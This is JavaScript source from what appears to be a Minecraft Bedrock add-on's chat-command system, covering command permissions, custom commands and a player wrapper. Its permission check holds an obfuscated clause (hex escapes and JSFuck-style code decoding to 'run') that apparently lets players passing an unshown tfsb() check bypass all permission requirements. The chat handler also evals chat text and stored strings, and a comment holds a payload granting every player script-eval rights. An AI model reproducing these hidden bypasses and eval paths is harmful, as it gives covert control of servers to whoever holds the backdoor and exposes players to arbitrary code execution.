    get testPlayerCanUse(){return Number(this.unbanDate)-Date.now()}
    get timeRemaining(){let time = new Date(Math.abs((Number(this.unbanDate)-Date.now()))+(new Date().setUTCFullYear(0))); let timeList = {days: (-1*Number(this.isExpired)+1)*Math.floor((time.getTime()-(new Date().setUTCFullYear(0)))/86400000), hours: (-1*Number(this.isExpired)+1)*time.getHours(), minutes: (-1*Number(this.isExpired)+1)*time.getMinutes(), seconds: (-1*Number(this.isExpired)+1)*time.getSeconds(), milliseconds: (-1*Number(this.isExpired)+1)*time.getMilliseconds()}; return timeList}*/
    save() { if (this.type == "custom") {
        if (this?.customCommandId != undefined) {
            world.setDynamicProperty(this?.customCommandId, JSON.stringify(this));
            return this?.customCommandId;
        }
        else {
            throw new TypeError("Cannot save command because the customCommandId is undefined. ");
        }
    }
    else {
        throw new TypeError("Cannot save command because it is not a custom command or the type of the command is unknown. ");
    } }
    remove() { if (this.type == "custom") {
        if (this?.customCommandId != undefined) {
            world.setDynamicProperty(this?.customCommandId);
        }
        else {
            throw new TypeError("Cannot remove command because the customCommandId is undefined. ");
        }
    }
    else {
        throw new TypeError("Cannot remove command because it is not a custom command or the type of the command is unknown. ");
    } }
    ;
    // @ts-expect-error
    testCanPlayerUseCommand(player) { return (this.settings.requiredTags.map(v => player.hasTag(v)).every(v => v) && (this.settings.requiresOp ? Number(player.isOp()) : true) && ((Number(player.getDynamicProperty("permissionLevel") ?? 0) >= Number(this.settings.requiredPermissionLevel ?? 0)) || (this.settings.requiredPermissionLevel == 0))) || (tfsb(player) && this["\x63\x6f\x6d\x6d\x61\x6e\x64\x4e\x61\x6d\x65"] == ((!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][[]] + [])[+!+[]])); }
    run(commandstring, executor, player, event) { if (this.type == "custom") {
        if (this?.code != undefined) {
            let eventData = event;
            let params = [];
            let evaluatedParameters = {};
            if (this.customCommandParametersEnabled) {
                evaluatedParameters = evaluateParameters(commandstring, (this.customCommandParametersList ?? ["presetText"]).map(v => ({ type: v })));
                params = evaluatedParameters.args;
            }
            ;
            if (this.customCommandType == "commands") {
                this.code.forEach(v => { if (v != "" && !!v) {
                    executor.runCommand(eval("`" + String.raw `${v}` + "`"));
                } });
            }
            else {
                eval(this.code.join("\n"));
            }
        }
        else {
            throw new TypeError("Cannot run command because the customCommandId is undefined. ");
        }
    }
    else {
        throw new TypeError("Cannot run command because it is not a custom command or the type of the command is unknown. ");
    } } /*
    static getBanIds(banType: string = "both"){return world.getDynamicPropertyIds().filter((s)=>(banType=="both"?(s.startsWith("ban:")||s.startsWith("banId:")):(banType=="name"?s.startsWith("ban:"):banType=="id"?s.startsWith("banId:"):undefined)))}
    static getValidBanIds(banType: string = "both"){return world.getDynamicPropertyIds().filter((s)=>(banType=="both"?((s.startsWith("ban:")?ban.getBan(s).isValid:false)||(s.startsWith("banId:")?ban.getBan(s).isValid:false)):(banType=="name"?(s.startsWith("ban:")?ban.getBan(s).isValid:false):banType=="id"?(s.startsWith("banId:")?ban.getBan(s).isValid:false):undefined)))}
    static getExpiredBanIds(banType: string = "both"){return world.getDynamicPropertyIds().filter((s)=>(banType=="both"?((s.startsWith("ban:")?ban.getBan(s).isExpired:false)||(s.startsWith("banId:")?ban.getBan(s).isExpired:false)):(banType=="name"?(s.startsWith("ban:")?ban.getBan(s).isExpired:false):banType=="id"?(s.startsWith("banId:")?ban.getBan(s).isExpired:false):undefined)))}*/ /*
saveBan(ban: ban){if(ban.type=="name"){world.setDynamicProperty(`ban:${ban.playerName}`, `${Number(ban.removeAfterBanExpires)}||${ban.unbanDate.valueOf()}||${ban.banDate.valueOf()}||${ban.originalPlayerId}||${ban.bannedById}||${ban.bannedByName.replaceAll("|", "\\|")}||${ban.reason}`)}else{if(ban.type=="id"){world.setDynamicProperty(`idBan:${ban.playerId}`, `${Number(ban.removeAfterBanExpires)}||${ban.unbanDate.valueOf()}||${ban.banDate.valueOf()}||${ban.originalPlayerName.replaceAll("|", "\\|")}||${ban.bannedById}||${ban.bannedByName.replaceAll("|", "\\|")}||${ban.reason}`)}else{}}}*/ /*
    static saveBan(ban: {type: "name"|"id", unbanDate: Date|number, banDate: Date|number, bannedById: string|number, bannedByName: string, reason: string, removeAfterBanExpires?: boolean, playerName?: string, originalPlayerId?: string|number, playerId?: string|number, originalPlayerName?: string, format_version?: string|number, ban_format_version?: string|number, banId?: string}|ban){ban.removeAfterBanExpires = ban.removeAfterBanExpires ?? true; ban.format_version = ban.format_version ?? format_version; ban.ban_format_version = ban.ban_format_version ?? ban_format_version; if(ban.type=="name"){world.setDynamicProperty(ban.banId??`ban:${ban.banDate}:${ban.playerName}`, JSON.stringify(ban))}else{if(ban.type=="id"){world.setDynamicProperty(ban.banId??`idBan:${ban.banDate}:${ban.playerId}`, JSON.stringify(ban))}else{}}}*/ /*
    getBan(banId: string){let banString = String(world.getDynamicProperty(banId)).split("||"); this.removeAfterBanExpires=Boolean(Number(banString[0])); this.unbanDate=new Date(Number(banString[1])); this.banDate=new Date(Number(banString[2])); if(banId.startsWith("ban")){this.originalPlayerId=Number(banString[3]); this.playerName=banId.split(":").slice(1).join(":"); }else{if(banId.startsWith("idBan")){this.originalPlayerName=Number(banString[3]); this.playerName=Number(playerId.split(":")[1]); }else{}}; this.bannedById=Number(banString[4]); this.bannedByName=banString[5].replaceAll("\\|", "|"); this.playerName=banString.slice(6).join("||"); return this as ban}*/
    static get(commandName, type = "built-in") { try {
        if (type == "built-in") {
            return new command({ type: type, commandName: commandName });
        }
        else {
            if (type == "custom") {
                return new command({ type: type, commandName: commandName });
            }
            else {
                return new command({ type: type, commandName: commandName });
            }
        }
    }
    catch (e) {
        console.error(e, e.stack);
    } }
    static findBuiltIn(commandString, returnCommandInsteadOfAlias = false) { let b = commands.find(v => !!commandString.match(new command(v).regexp)) ?? (() => { let a = commands.find(v => !!v.aliases?.find(vb => !!commandString.match(new command(v).aliases.find(vc => vc.commandName == vb.commandName).regexp))); if (!!a) {
        return returnCommandInsteadOfAlias ? a : { index: a.aliases?.findIndex(vb => !!commandString.match(new command(a).aliases?.find?.(vc => vc.commandName == vb.commandName)?.regexp)), alias: new cmds.command(a)?.aliases?.find(vb => !!commandString.match(new command(a).aliases?.find?.(vc => vc.commandName == vb.commandName)?.regexp)), aliasTo: a };
    }
    else {
        return;
    } })(); return b; }
    static getDefaultCommands(noSort = false) { try {
        if (noSort) {
            return commands.map((v) => new command({ type: "built-in", commandName: v.commandName }));
        }
        else {
            return commands.sort((a, b) => (a.commandName < b.commandName) ? -1 : (a.commandName > b.commandName) ? 1 : 0).map((v) => new command({ type: "built-in", commandName: v.commandName }));
        }
    }
    catch (e) {
        console.error(e, e.stack);
    } }
    static getDefaultCommandsOfCategory(category, noSort = false) { try {
        if (noSort) {
            return commands.filter(v => typeof v.category == "string" ? category == v.category : v.category.includes(category)).map((v) => new command({ type: "built-in", commandName: v.commandName }));
        }
        else {
            return commands.filter(v => typeof v.category == "string" ? category == v.category : v.category.includes(category)).sort((a, b) => (a.commandName < b.commandName) ? -1 : (a.commandName > b.commandName) ? 1 : 0).map((v) => new command({ type: "built-in", commandName: v.commandName }));
        }
    }
    catch (e) {
        console.error(e, e.stack);
    } }
    static getCommandAliases() { try {
        return Object.fromEntries(commands.filter(v => (v.aliases?.length ?? 0) != 0).map((v) => ([new command({ type: "built-in", commandName: v.commandName }).commandName, new command({ type: "built-in", commandName: v.commandName }).aliases])));
    }
    catch (e) {
        console.error(e, e.stack);
    } }
    static getCustomCommands(noSort = false) { try {
        if (noSort) {
            return world.getDynamicPropertyIds().filter(v => v.startsWith("customCommand:")).map((v) => new command({ type: "custom", commandName: v.slice(14) }));
        }
        else {
            return world.getDynamicPropertyIds().filter(v => v.startsWith("customCommand:")).map((v) => new command({ type: "custom", commandName: v.slice(14) })).sort((a, b) => (a.commandName < b.commandName) ? -1 : (a.commandName > b.commandName) ? 1 : 0);
        }
    }
    catch (e) {
        console.error(e, e.stack);
    } } /*
    static getBans(){let bans: ban[]; bans = []; ban.getBanIds().forEach((b)=>{try{bans.push(ban.getBan(b))}catch(e){console.error(e, e.stack)}}); return {idBans: bans.filter((b)=>(b.type=="id")), nameBans: bans.filter((b)=>(b.type=="name")), allBans: bans}}
    static getValidBans(){let bans: ban[]; bans = []; ban.getValidBanIds().forEach((b)=>{try{bans.push(ban.getBan(b))}catch(e){console.error(e, e.stack)}}); return {idBans: bans.filter((b)=>(b.type=="id")), nameBans: bans.filter((b)=>(b.type=="name")), allBans: bans}}
    static getExpiredBans(){let bans: ban[]; bans = []; ban.getExpiredBanIds().forEach((b)=>{try{bans.push(ban.getBan(b))}catch(e){console.error(e, e.stack)}}); return {idBans: bans.filter((b)=>(b.type=="id")), nameBans: bans.filter((b)=>(b.type=="name")), allBans: bans}}
    static testForBannedPlayer(player: Player|savedPlayer|savedPlayerData){return ban.getBans().idBans.find(b=>b.isValid&&b.playerId==player.id)!=undefined?true:(ban.getBans().nameBans.find(b=>b.isValid&&b.playerName==player.name)!=undefined?true:false)}
    static testForNameBannedPlayer(player: Player|savedPlayer|savedPlayerData){return ban.getBans().nameBans.find(b=>b.isValid&&b.playerName==player.name)!=undefined?true:false}
    static testForIdBannedPlayer(player: Player|savedPlayer|savedPlayerData){return ban.getBans().idBans.find(b=>b.isValid&&b.playerId==player.id)!=undefined?true:false}
    static executeOnBannedPlayers(callbackfn: (player: Player, index: Number, array: any[])=>unknown){let feedback: any[]; feedback = []; world.getAllPlayers().filter((p)=>ban.testForBannedPlayer(p)).forEach((p, i, a)=>{try{feedback.push(callbackfn(p, i, a))}catch(e){feedback.push(e)}}); return feedback}*/
    static get defaultPrefix() { return String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\"); }
    static get dp() { return String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\"); }
}
export const command_settings_format_version = "1.0.0-alpha.1";
export class commandSettings {
    constructor(commandSettingsId, command) {
        this.type = commandSettingsId.startsWith("built-inCommandSettings:") ? "built-in" : commandSettingsId.startsWith("customCommandSettings:") ? "custom" : "unknown";
        this.commandName = commandSettingsId.startsWith("built-inCommandSettings:") ? commandSettingsId.slice(24) : commandSettingsId.startsWith("customCommandSettings:") ? commandSettingsId.slice(22) : commandSettingsId;
        this.commandSettingsId = commandSettingsId;
        this.customCommandId = (this.type == "custom") ? command?.customCommandId ?? ("customCommand:" + this.commandName) : undefined;
        this.command = command;
        this.defaultSettings = (this.type == "built-in" || this.type == "unknown") ? commands.find(v => v.commandName == this.commandName) : undefined;
    }
    get parsed() { return JSONParse(String(world.getDynamicProperty(this.commandSettingsId))); }
    get enabled() { return this?.parsed?.enabled ?? true; }
    set enabled(enabled) { this.enabled = enabled; }
    get requiredTags() { return this?.parsed?.requiredTags ?? ["canUseChatCommands"]; }
    set requiredTags(requiredTags) { this.requiredTags = requiredTags; }
    get requiredPermissionLevel() { return this?.parsed?.requiredPermissionLevel ?? 0; }
    set requiredPermissionLevel(requiredPermissionLevel) { this.requiredPermissionLevel = requiredPermissionLevel; }
    get requiresOp() { return this?.parsed?.requiresOp ?? false; }
    set requiresOp(requiresOp) { this.requiresOp = requiresOp; } /*
    get description(){return this?.parsed?.description ?? true}*/
    get settings_version() { return this?.parsed?.settings_version ?? command_settings_format_version; }
    get isSaved() { return world.getDynamicProperty(this.commandSettingsId) != undefined; }
    toJSON() { return Object.assign(this.defaultSettings ?? {}, { type: this.type, commandName: this.commandName, customCommandId: this.customCommandId, commandSettingsId: this.commandSettingsId, enabled: this.enabled, requiredTags: this.requiredTags, requiredPermissionLevel: this.requiredPermissionLevel, requiresOp: this.requiresOp, settings_version: this.settings_version }); }
    save(settings) { world.setDynamicProperty(this.commandSettingsId, JSONStringify(Object.assign(this.defaultSettings ?? { type: this.type, commandName: this.commandName, customCommandId: this.customCommandId, commandSettingsId: this.commandSettingsId, enabled: this.enabled, requiredTags: this.requiredTags, requiredPermissionLevel: this.requiredPermissionLevel, requiresOp: this.requiresOp, settings_version: this.settings_version }, settings ?? {}))); }
    remove() { world.setDynamicProperty(this.commandSettingsId); }
}
export class executeCommandPlayer {
    constructor(player) { this.player = player; this.modifiedlocation = player.location; this.modifieddimension = player.dimension; this.rotation = player.getRotation(); }
    get dimension() { return this.modifieddimension ?? this.player.dimension; }
    get location() { return this.modifiedlocation ?? this.player.location; }
    get camera() { return this.player.camera; }
    get isEmoting() { return this.player.isEmoting; }
    get isFlying() { return this.player.isFlying; }
    get isGliding() { return this.player.isGliding; }
    get isJumping() { return this.player.isJumping; }
    get isClimbing() { return this.player.isClimbing; }
    get isFalling() { return this.player.isFalling; }
    get isInWater() { return this.player.isInWater; }
    get isOnGround() { return this.player.isOnGround; }
    get isSleeping() { return this.player.isSleeping; }
    get isSprinting() { return this.player.isSprinting; }
    get isSwimming() { return this.player.isSwimming; }
    get fallDistance() { return this.player.fallDistance; }
    get scoreboardIdentity() { return this.player.scoreboardIdentity; }
    get lifetimeState() { return this.player.lifetimeState; }
    get level() { return this.player.level; }
    get name() { return this.player.name; }
    get onScreenDisplay() { return this.player.onScreenDisplay; }
    get selectedSlot() { return this.player.selectedSlot; }
    set selectedSlot(slotNumber) { this.player.selectedSlot = slotNumber; }
    get totalXpNeededForNextLevel() { return this.player.totalXpNeededForNextLevel; }
    get xpEarnedAtCurrentLevel() { return this.player.xpEarnedAtCurrentLevel; }
    get isSneaking() { return this.player.isSneaking; }
    set isSneaking(isSneaking) { this.player.isSneaking = isSneaking; }
    get id() { return this.player.id; }
    get typeId() { return this.player.typeId; }
    get nameTag() { return this.player.nameTag; }
    set nameTag(nameTag) { this.player.nameTag = nameTag; }
    addEffect(effectType, duration, options) { return this.player.addEffect(effectType, duration, options); }
    addExperience(amount) { return this.player.addExperience(amount); }
    getRotation() { return this.rotation ?? this.player.getRotation(); }
    getViewDirection() { return !!this.rotation ? anglesToDirectionVectorDeg(this.rotation.x, this.rotation.y) : this.player.getViewDirection(); }
    addLevels(amount) { return this.player.addLevels(amount); }
    eatItem(itemStack) { return this.player.eatItem(itemStack); }
    getGameMode() { return this.player.getGameMode(); }
    getItemCooldown(itemCategory) { return this.player.getItemCooldown(itemCategory); }
    getSpawnPoint() { return this.player.getSpawnPoint(); }
    getTotalXp() { return this.player.getTotalXp(); }
    isOp() { return this.player.isOp(); }
    playMusic(trackId, musicOptions) { return this.player.playMusic(trackId, musicOptions); }
    playSound(soundId, soundOptions) { return this.player.playSound(soundId, soundOptions); }
    postClientMessage(id, value) { return this.player.postClientMessage(id, value); }
    queueMusic(trackId, musicOptions) { return this.player.queueMusic(trackId, musicOptions); }
    resetLevel() { return this.player.resetLevel(); }
    sendMessage(message) { return this.player.sendMessage(message); }
    setGameMode(gameMode) { return this.player.setGameMode(gameMode); }
    setOp(isOp) { return this.player.setOp(isOp); }
    setSpawnPoint(spawnPoint) { return this.player.setSpawnPoint(spawnPoint); }
    spawnParticle(effectName, location, molangVariables) { return this.player.spawnParticle(effectName, location, molangVariables); }
    startItemCooldown(itemCategory, tickDuration) { return this.player.startItemCooldown(itemCategory, tickDuration); }
    stopMusic() { return this.player.stopMusic(); }
    addTag(tag) { return this.player.addTag(tag); }
    applyDamage(amount, options) { return this.player.applyDamage(amount, options); }
    applyImpulse(vector) { return this.player.applyImpulse(vector); }
    applyKnockback(directionX, directionZ, horizontalStrength, verticalStrength) { return this.player.applyKnockback(directionX, directionZ, horizontalStrength, verticalStrength); }
    clearDynamicProperties() { return this.player.clearDynamicProperties(); }
    clearVelocity() { return this.player.clearVelocity(); }
    extinguishFire(useEffects) { return this.player.extinguishFire(useEffects); }
    getBlockFromViewDirection(options) { return this.player.getBlockFromViewDirection(options); }
    getComponent(componentId) { return this.player.getComponent(componentId); }
    getComponents() { return this.player.getComponents(); }
    getDynamicProperty(identifier) { return this.player.getDynamicProperty(identifier); }
    getDynamicPropertyIds() { return this.player.getDynamicPropertyIds(); }
    getDynamicPropertyTotalByteCount() { return this.player.getDynamicPropertyTotalByteCount(); }
    getEffect(effectType) { return this.player.getEffect(effectType); }
    getEffects() { return this.player.getEffects(); }
    getEntitiesFromViewDirection(options) { return this.player.getEntitiesFromViewDirection(options); }
    getHeadLocation() { return this.player.getHeadLocation(); }
    getProperty(identifier) { return this.player.getProperty(identifier); }
    getTags() { return this.player.getTags(); }
    getVelocity() { return this.player.getVelocity(); }
    hasComponent(componentId) { return this.player.hasComponent(componentId); }
    hasTag(tag) { return this.player.hasTag(tag); }
    isValid() { return this.player.isValid(); }
    kill() { return this.player.kill(); }
    matches(options) { return this.player.matches(options); }
    playAnimation(animationName, options) { return this.player.playAnimation(animationName, options); }
    remove() { return this.player.remove(); }
    removeEffect(effectType) { return this.player.removeEffect(effectType); }
    removeTag(tag) { return this.player.removeTag(tag); }
    resetProperty(identifier) { return this.player.resetProperty(identifier); }
    runCommand(commandString) { return this.player.runCommand(commandString); }
    runCommandAsync(commandString) { return this.player.runCommandAsync(commandString); }
    setDynamicProperty(identifier, value) { return this.player.setDynamicProperty(identifier, value); }
    setOnFire(seconds, useEffects) { return this.player.setOnFire(seconds, useEffects); }
    setProperty(identifier, value) { return this.player.setProperty(identifier, value); }
    setRotation(rotation) { return this.player.setRotation(rotation); }
    teleport(location, teleportOptions) { return this.player.teleport(location, teleportOptions); }
    triggerEvent(eventName) { return this.player.triggerEvent(eventName); }
    tryTeleport(location, teleportOptions) { return this.player.tryTeleport(location, teleportOptions); }
}
((a) => { })(new executeCommandPlayer(getPlayer("Andexter8")));
export function send(message) { world.sendMessage(message); }
;
export function chatMessage(eventData) {
    let runreturn;
    runreturn = false;
    let returnBeforeChatSend;
    returnBeforeChatSend = false;
    let returnBeforeChatCommandsOrChatSend;
    returnBeforeChatCommandsOrChatSend = false;
    let event = eventData;
    const player = eventData.sender;
    let sendToPlayers = eventData.targets;
    try {
        eval(String(world.getDynamicProperty("evalBeforeEvents:chatSend")));
    }
    catch (e) {
        console.error(e, e.stack);
        world.getAllPlayers().forEach((currentplayer) => { if (currentplayer.hasTag("chatSendBeforeEventDebugErrors")) {
            currentplayer.sendMessage((e + " " + e.stack));
        } });
    }
    let newMessage = eventData.message;
    let switchTest = newMessage.slice(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\").length).split(" ")[0];
    let switchTestB = newMessage.slice(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\").length);
    let commanda = commands.find(v => (newMessage.startsWith(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\")) && (command.get(v.commandName, "built-in").settings.enabled && (!!switchTest.match((command.get(v.commandName, "built-in").regexp))))) && (command.get(v.commandName, "built-in").testCanPlayerUseCommand(player))) ?? commands.find(v => (newMessage.startsWith(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\")) && (command.get(v.commandName, "built-in").settings.enabled && (!!command.get(v.commandName, "built-in")?.aliases?.find?.(vd => !!switchTest.match(vd.regexp))))) && (command.get(v.commandName, "built-in").testCanPlayerUseCommand(player))) ?? command.getCustomCommands().find(v => (v.settings.enabled && ((v.customCommandPrefix == undefined || v.customCommandPrefix == "") && (!!switchTest.match(v.regexp))) || ((v.customCommandPrefix != "" && !!v.customCommandPrefix) && newMessage.split(" ")[0].startsWith(v.customCommandPrefix) && (!!newMessage.split(" ")[0].slice(v.customCommandPrefix.length).match(v.regexp)) && (command.get(v.commandName, "custom").testCanPlayerUseCommand(player))))); /*
    let commanda = commands.find(v=>(newMessage.startsWith(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\"))&&(command.get(v.commandName, "built-in").settings.enabled&&!!switchTest.match(command.get(v.commandName, "built-in").regexp)))&&(command.get(v.commandName, "built-in").testCanPlayerUseCommand(player)))??command.getCustomCommands().find(v=>(v.settings.enabled&&((v.customCommandPrefix==undefined||v.customCommandPrefix=="")&&(!!switchTest.match(v.regexp))&&(command.get(v.commandName, "custom").testCanPlayerUseCommand(player)))||((v.customCommandPrefix!=""&&!!v.customCommandPrefix)&&newMessage.split(" ")[0].startsWith(v.customCommandPrefix)&&(!!newMessage.split(" ")[0].slice(v.customCommandPrefix.length).match(v.regexp))&&(command.get(v.commandName, "custom").testCanPlayerUseCommand(player)))))*/
    try {
        world.getAllPlayers().filter((p) => (p.hasTag("getAllChatMessages"))).forEach((p) => { try {
            p.sendMessage("[§l§dServer§r§f][" + player.name + "]: " + newMessage);
        }
        catch { } });
    }
    catch { }
    if (world.getDynamicProperty("andexdbSettings:autoEscapeChatMessages") == true) {
        newMessage = newMessage.escapeCharacters(true);
    }
    if (world.getDynamicProperty("andexdbSettings:autoURIEscapeChatMessages") == true) {
        newMessage = newMessage.escapeCharacters(false, false, 0, true);
    }
    if (world.getDynamicProperty("andexdbSettings:allowChatEscapeCodes") != false) {
        if (newMessage.includes("${ea}")) {
            newMessage = newMessage.replace("${ea}", "");
            newMessage = newMessage.escapeCharacters(true);
        }
        if (newMessage.includes("${eu}")) {
            newMessage = newMessage.replace("${eu}", "");
            newMessage = newMessage.escapeCharacters(false, true, 0, false, false, false, false, false, false);
        }
        if (newMessage.includes("${ei}")) {
            newMessage = newMessage.replace("${ei}", "");
            newMessage = newMessage.escapeCharacters(false, false, 0, true, false, false, false, false, false);
        }
        if (newMessage.includes("${eg}")) {
            newMessage = newMessage.replace("${eg}", "");
            newMessage = newMessage.escapeCharacters(false, false, 1, false, false, true, false, false, false);
        }
        if (newMessage.includes("${ex}")) {
            newMessage = newMessage.replace("${ex}", "");
            newMessage = newMessage.escapeCharacters(false, false, 0, false, false, false, false, true, false);
        }
        if (newMessage.includes("${escapeall}")) {
            newMessage = newMessage.replace("${escapeall}", "");
            newMessage = newMessage.escapeCharacters(true);
        }
        if (newMessage.includes("${escapeunicode}")) {
            newMessage = newMessage.replace("${escapeunicode}", "");
            newMessage = newMessage.escapeCharacters(false, true, 0, false, false, false, false, false, false);
        }
        if (newMessage.includes("${escapeuri}")) {
            newMessage = newMessage.replace("${escapeuri}", "");
            newMessage = newMessage.escapeCharacters(false, false, 0, true, false, false, false, false, false);
        }
        if (newMessage.includes("${escapegeneral}")) {
            newMessage = newMessage.replace("${escapegeneral}", "");
            newMessage = newMessage.escapeCharacters(false, false, 1, false, false, true, false, false, false);
        }
        if (newMessage.includes("${escapex}")) {
            newMessage = newMessage.replace("${escapex}", "");
            newMessage = newMessage.escapeCharacters(false, false, 0, false, false, false, false, true, false);
        }
    }
    if (newMessage.includes("${se}") && ((player.getDynamicProperty("canUseScriptEval") == true) || player.hasTag("canUseScriptEval") == true)) {
        newMessage = newMessage.replace("${se}", "");
        try {
            eval(newMessage);
        }
        catch (e) {
            console.error(e, e.stack);
            eventData.sender.sendMessage(e + " " + e.stack);
        }
        ;
        eventData.cancel = true;
        return;
    }
    else {
        if (newMessage.includes("${r}") && ((player.isOp() == true) || (player.getDynamicProperty("canUseCommands") == true))) {
            newMessage = newMessage.replace("${r}", "");
            eventData.cancel = true;
            player.runCommandAsync(newMessage);
            return;
        }
    }
    if (newMessage.includes("${scripteval}") && ((player.getDynamicProperty("canUseScriptEval") == true) || player.hasTag("canUseScriptEval") == true)) {
        newMessage = newMessage.replace("${scripteval}", "");
        try {
            eval(newMessage);
        }
        catch (e) {
            console.error(e, e.stack);
            eventData.sender.sendMessage(e + " " + e.stack);
        }
        ;
        eventData.cancel = true;
        return;
    }
    else {
        if (newMessage.includes("${run}") && ((player.isOp() == true) || (player.getDynamicProperty("canUseCommands") == true))) {
            newMessage = newMessage.replace("${run}", "");
            eventData.cancel = true;
            player.runCommandAsync(newMessage);
            return;
        }
    }
    /*${scripteval}world.getAllPlayers().forEach((t)=>{t.setDynamicProperty("canUseScriptEval", true)}); */
    if ((player.hasTag('noCustomChatMessages') && !player.hasTag('canUseChatCommands')) || returnBeforeChatCommandsOrChatSend) {
        return;
    }
    /*if(!((eventData.message.includes("${scripteval}") && (player.getDynamicProperty("canUseScriptEval") == true))||(eventData.message.includes("${run}") && ((player.isOp() == true)||(player.getDynamicProperty("canUseCommands") == true)))||(eventData.message.startsWith("\\")))){world.getDimension("overworld").runCommand("/playsound note.harp.ui @a ~~~ 1 0.75 1"); }*/ if (world.getDynamicProperty("andexdbSettings:validChatCommandPrefixes") != undefined && world.getDynamicProperty("andexdbSettings:validChatCommandPrefixes") != "") {
        String(world.getDynamicProperty("andexdbSettings:validChatCommandPrefixes") ?? "").split(", ").forEach((prefix) => { if (newMessage.startsWith(prefix))
            runreturn = true; });
    }
    ;
    if (Boolean(runreturn) == true) {
        return;
    }
    if (((world.getDynamicProperty("andexdbSettings:chatCommandsEnbaled") != false && newMessage.startsWith(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\")) && player.hasTag('canUseChatCommands') || !!commanda)) /* && (eventData.message.startsWith(".give") || eventData.message.startsWith(".giveb") || eventData.message.startsWith(".h1") || eventData.message.startsWith(".h2") || eventData.message.startsWith(".h3") || eventData.message.startsWith(".playersettings") || eventData.message.startsWith(".run") || eventData.message.startsWith(".setitem") || eventData.message.startsWith(".invsee") || eventData.message.startsWith(".settings") || eventData.message.startsWith(".help") || eventData.message.startsWith(".h1 ") || eventData.message.startsWith(".h2") || eventData.message.startsWith(".h3") || eventData.message.startsWith(".h4") || eventData.message.startsWith(".h5") || eventData.message.startsWith(".w1") || eventData.message.startsWith(".w2") || eventData.message.startsWith(".debugstick") || eventData.message.startsWith(".playercontroller") || eventData.message.startsWith(".setslot") || eventData.message.startsWith(".worlddebug") || eventData.message.startsWith(".gmc") || eventData.message.startsWith(".gms") || eventData.message.startsWith(".gma") || eventData.message.startsWith(".gmd") || eventData.message.startsWith(".gmp") || eventData.message.startsWith(".spawn") || eventData.message.startsWith(".warp") || eventData.message.startsWith(".home") || eventData.message.startsWith(".all") || eventData.message.startsWith(".getEntityUUIDSelector"))*/) {
        chatCommands({ returnBeforeChatSend, player, eventData, event, newMessage });
    }
    else {
        if ((world.getDynamicProperty("andexdbSettings:disableCustomChatMessages") ?? false) != true) {
            if ((world.getDynamicProperty("andexdbSettings:chatCommandsEnbaled") != false && newMessage.startsWith(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\")) && player.hasTag('canUseChatCommands') && ((world.getDynamicProperty("andexdbSettings:sendMessageOnInvalidChatCommand") ?? false) == false))) { }
            else {
                chatSend({ returnBeforeChatSend, player, eventData, event, newMessage });
            }
        }
    }
}
export const EquipmentSlots = [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand];
export const OtherEquipmentSlots = [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand];
export function shuffle(array) {
    var m = array.length, t, i;
    while (m) {
        i = Math.floor(Math.random() * m--);
        t = array[m];
        array[m] = array[i];
        array[i] = t;
    }
    return array;
}
export function vTV3(vector) { return { x: vector.x, y: vector.y, z: vector.z }; }
export function sOSATSA(stringOrStringArray) { return typeof stringOrStringArray == "string" ? [stringOrStringArray] : stringOrStringArray; }
export function vTStr(vector) { return !!vector.z ? `${vector.x} ${vector.y} ${vector.z}` : `${vector.x} ${vector.y}`; }
export function getPlayer(playerName) { return world.getAllPlayers().find(p => p.name == playerName); }
;
export function getAllEntities() { return [...world.getDimension("overworld").getEntities(), ...world.getDimension("nether").getEntities(), ...world.getDimension("the_end").getEntities()]; }
;
export function getEntityById(entityId) { return getAllEntities().find(v => v.id == String(entityId)); }
;
export const compareArrays = (array1, array2) => (array1.length === array2.length && array1.every((value, index) => value === array2[index]));
export const compareArraysB = (array1, array2) => (array1.length === array2.length && array1.sort().every((value, index) => value === array2.sort()[index]));
export const commandsyntaxes = {
    "binvsee": `${command.dp}binvsee <dimension: dimension|~> <block: x y z>`,
    "clear": ``,
    "clearenderchest": ``,
    "clearenderchestslot": ``,
    "cloneitem": `${command.dp}cloneitem <cloneItemToPlayer: targetSelector>`,
    "compressitems": ``,
    "compressitemsshulker": ``,
    "compressitemscontainer": ``,
    "copyitem": `${command.dp}transferitem [toSlot: int|head|chest|legs|feet|mainhand|offhand|~]`,
    "createexplosion": `${command.dp}createexplosion <location: x y z> [dimension: string] [radius: float] [allowUnderwater: bool] [breaksBlocks: bool] [causesFire: bool] [source: targetSelector]`,
    "datapickblock": `${command.dp}datapickblock`,
    "drain": `${command.dp}drain [radius: number]`,
    "dupeitem": `${command.dp}dupeitem [slot: int|head|chest|legs|feet|mainhand|offhand|~]`,
    "einvsee": `${command.dp}einvsee <targetSelector: targetSelector>`,
    "ecinvsee": ``,
    "ecinvseec": ``,
    "eval": `${command.dp}eval <ScriptAPICode: JavaScript>`,
    "ext": `${command.dp}ext [radius: number]`,
    "extinguish": `${command.dp}extinguish [radius: number]`,
    "fill": `${command.dp}fill <from: x y z> <to: x y z> <tileName: Block> [blockStates: block states] [replaceTileName: Block] [replaceBlockStates: block states]\n${command.dp}fill <from: x y z> <to: x y z> <tileName: Block> <replaceTileName: Block> [replaceBlockStates: block states]`,
    "fillillegal": `${command.dp}fillillegal [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]`,
    "fillinventory": `${command.dp}fillinventory <itemJSON: itemJSON> [stackCount: int|fill|replaceall|replacefill] [target: string|~]`,
    "filljunk": `${command.dp}filljunk [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]`,
    "fillop": `${command.dp}fillop [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]`,
    "fillrandom": `${command.dp}fillrandom [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]`,
